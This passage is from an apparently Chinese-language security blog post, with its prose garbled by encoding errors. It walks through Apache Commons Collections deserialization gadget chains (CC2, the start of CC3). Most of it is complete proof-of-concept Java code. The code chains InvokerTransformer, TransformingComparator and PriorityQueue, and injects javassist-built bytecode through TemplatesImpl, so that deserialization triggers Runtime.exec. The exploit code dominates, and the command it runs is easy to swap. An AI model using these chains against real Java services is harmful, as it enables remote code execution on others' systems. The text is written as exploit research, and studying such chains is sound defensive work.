class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">final</span> Comparator&lt;O&gt; decorated)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.decorated = decorated;<br>        <span class="hljs-keyword">this</span>.transformer = transformer;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> </span>&#123;<br>        <span class="hljs-keyword">final</span> O value1 = <span class="hljs-keyword">this</span>.transformer.transform(obj1);<br>        <span class="hljs-keyword">final</span> O value2 = <span class="hljs-keyword">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>äºæ˜¯åœ¨<code>PriorityQueue queue = new PriorityQueue(1,transformingComparator);</code>ä¼ å…¥çš„<code>comparator</code>å°±ä¸º<code>TransformingComparator</code>ï¼Œè°ƒç”¨åˆ°<code>comparator.compare(x, (E) c)</code>å°±èƒ½ RCE</p>
<p>å¾ˆç†Ÿæ‚‰ï¼Œè¿™æ˜¯æ¥è‡ªäº cc1 çš„ååŠæ®µé“¾ï¼Œè€Œä¸”<code>transformer</code>å¯æ§ï¼Œpoc å»¶é•¿å¦‚ä¸‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(transformingComparator);<br><span class="hljs-comment">//        PriorityQueue queue = new PriorityQueue(1,transformingComparator);</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆæ˜¯<code>TransformingComparator</code>å¤„ç†äº†<code>chainedTransformer</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<span class="hljs-comment">//ä¸ºä»€ä¹ˆä¼ å…¥1ï¼Œä¹Ÿå¯ä»¥ä¼ å…¥PriorityQueue(1,transformingComparator)</span><br>queue.add(<span class="hljs-number">1</span>);<br>queue.add(<span class="hljs-number">2</span>);<span class="hljs-comment">//ä¸ºä»€ä¹ˆè¦æ·»åŠ ä¸¤ä¸ªå…ƒç´ </span><br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œçœ‹å…¶æ„é€ æ–¹æ³•ï¼Œæœ€åéƒ½æ˜¯<code>this</code>æŒ‡å‘ä¸€ä¸ªæ„é€ æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span class="hljs-params"><span class="hljs-function">                     Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>    <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>    <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>    <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>    <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>    <span class="hljs-keyword">this</span>.comparator = comparator;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è€Œæˆ‘ä»¬ä¿è¯ä¸€ä¸ªå‚æ•°ä¸å°äº 1ï¼Œä¹Ÿå°±æ˜¯æˆå‘˜å˜é‡èƒ½èµ‹åˆ°å€¼å°±è¡Œï¼Œä¸èµ‹å€¼ç»è¿‡ this è½¬æ¢åä¼ è¿›å»<code>DEFAULT_INITIAL_CAPACITY=11</code>ä¹Ÿå¤§äº 1</p>
<p>ç¬¬äºŒä¸ªé—®é¢˜</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">add</span><span class="hljs-params">(E e)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> offer(e);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">offer</span><span class="hljs-params">(E e)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (e == <span class="hljs-keyword">null</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NullPointerException();<br>        modCount++;<br>        <span class="hljs-keyword">int</span> i = size;<br>        <span class="hljs-keyword">if</span> (i &gt;= queue.length)<br>            grow(i + <span class="hljs-number">1</span>);<br>        size = i + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>            queue[<span class="hljs-number">0</span>] = e;<br>        <span class="hljs-keyword">else</span><br>            siftUp(i, e);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>add</code>ä¸¤æ¬¡å<code>size = i + 1;</code>ï¼Œæ­¤æ—¶<code>size=2</code>ï¼Œåœ¨<code>heapify#for</code>é€»è¾‘æ‰èƒ½è¿›å»(<code>size &gt;&gt;&gt; 1 = 0</code>)ï¼›å¦åˆ™<code>1 &gt;&gt;&gt; 1 = 0</code></p>
<p>æ­¤æ—¶èƒ½å¤Ÿè°ƒç”¨<code>siftDown</code>æ–¹æ³•äº†ï¼Œæ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œè¦è°ƒç”¨<code>siftDownUsingComparator</code>ï¼Œæ»¡è¶³éç©ºï¼Œæ­¤æ—¶ä¼ å…¥<code>comparator</code>ä¸º<code>TransformingComparator</code>å³å¯</p>
<p>ä½†è¿™ä¸ª poc åœ¨ç¼–å†™æ—¶ä¼šè§¦å‘ï¼Œå¯ä»¥è§„é¿è¿™ä¸ªé—®é¢˜ï¼šä¸ç›´æ¥å¾€<code>PriorityQueue</code>æ„é€ æ–¹æ³•ä¼ å…¥<code>TransformingComparator</code>ï¼Œè€Œæ˜¯å…ˆè®©å…¶ä¼ å…¥å…¶ä¸­ä¸€ä¸ªæ„é€ æ–¹æ³•â€”â€”ç½®ç©º<code>Comparator</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, <span class="hljs-keyword">null</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>(initialCapacity, <span class="hljs-keyword">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>éšå add æ·»åŠ ä¸¤æ¬¡å…ƒç´ åé€šè¿‡åå°„æ›¿æ¢<code>Comparator</code>ä¸º<code>TransformingComparator</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        Field comparator = clz.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<span class="hljs-comment">//getFieldæ— æ³•è·å¾—</span><br>        comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator.set(queue, transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ‰æ–‡ç« æåˆ°è¦åœ¨ add ä¹‹åæ‰é€šè¿‡åå°„ä¿®æ”¹ comparator çš„å€¼ï¼šadd-&gt;offer-&gt;siftUpï¼Œæ­¤æ—¶è¦ä¿è¯<code>comparator</code>çš„å€¼ä¸º nullï¼Œæ‰èƒ½æ·»åŠ å…ƒç´ ï¼Œå¦åˆ™ä¼šå‡ºç°æŠ¥é”™ï¼Œä½†æˆ‘æµ‹è¯•æ²¡æœ‰é—®é¢˜ï¼Œä¸çŸ¥é“æ˜¯å¦ç‰ˆæœ¬é—®é¢˜</p>
<h3 id="Gadget-1"><a href="#Gadget-1" class="headerlink" title="Gadget"></a>Gadget</h3><p>ç„¶è€Œ cc2 ç”¨çš„é“¾ä»ç„¶ä¸æˆ‘ä»¬çš„ä¸ä¸€è‡´ï¼Œcc2 ä½¿ç”¨çš„æ˜¯<code>javassist</code>å’Œ<code>TemplatesImpl</code></p>
<p>é‚£ä¹ˆç°åœ¨éœ€è¦å°†<code>TemplatesImpl.newTransformer</code>è§¦å‘çš„æ–¹å¼ï¼Œè¿›ä¸€æ­¥é€šè¿‡<code>PriorityQueue</code>å’Œ<code>TransformingComparator.compare</code>åºåˆ—åŒ–ä»¥åŠ<code>InvokerTransformer.transform</code>æ‰§è¡Œä»»æ„ä»£ç å»¶é•¿</p>
<p>poc å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br><span class="hljs-comment">//        setFieldValue(templatesimpl,&quot;_class&quot;,null);</span><br><span class="hljs-comment">//        setFieldValue(templatesimpl,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><br>        InvokerTransformer newTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(newTransformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br>        Object[] queue_array =<span class="hljs-keyword">new</span> Object[] &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,queue_array);<br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;comparator&quot;</span>,transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¹‹å‰æåˆ°<code>_tfactory</code>å’Œ<code>_class</code>å› ä¸º<code>TransformerFactoryImpl</code>ç½®ä¸ºç©ºä»¥åŠ<code>TemplatesImpl</code>ä¼šèµ‹å€¼<code>_class</code>ï¼Œè¿™é‡Œ poc å´ä¸éœ€è¦å†è®¾ç½®å…¶å€¼ï¼Œå› ä¸ºåœ¨è§¦å‘åˆ°<code>TemplateImpl.newTransformer.TransformerImpl</code>ä¼šè®¾ç½®<code>_tfactory</code>å€¼ä¸º<code>TransformerFactoryImpl _tfactory = null</code>ï¼Œ<code>_class</code>å€¼åˆ™æ˜¯<code>_class = new Class[classCount]=new Class[1]=null</code>ï¼Œç¬¦åˆè¿›å…¥<code>defineTransletClasses</code>çš„æ¡ä»¶</p>
<p>è€Œ<code>PriorityQueue</code>éœ€è¦ add ä¸¤æ¬¡(è¿™é‡Œæ²¡æœ‰è¿›è¡Œ addï¼Œè€Œæ˜¯é€šè¿‡åå°„ç›´æ¥è®¾ç½®<code>size</code>ï¼Œå› æ­¤ä¸å—å…¶æ„é€ æ–¹æ³•çš„<code>initialCapacity</code>ä¼ å€¼å½±å“)ï¼Œå¹¶è®¾ç½®<code>comparator</code>ä¸º<code>TransformingComparator</code>å®ä¾‹å¯¹è±¡æ‰èƒ½æˆåŠŸè°ƒç”¨ï¼Œå‰é¢å·²ç»åˆ†æè¿‡äº†ä¸å†èµ˜è¿°</p>
<h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><h3 id="Pre-2"><a href="#Pre-2" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-2"><a href="#é™åˆ¶-2" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk1.7 &lt; 8u71</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-2"><a href="#åˆ©ç”¨é“¾-2" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>              <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                              TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                       <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

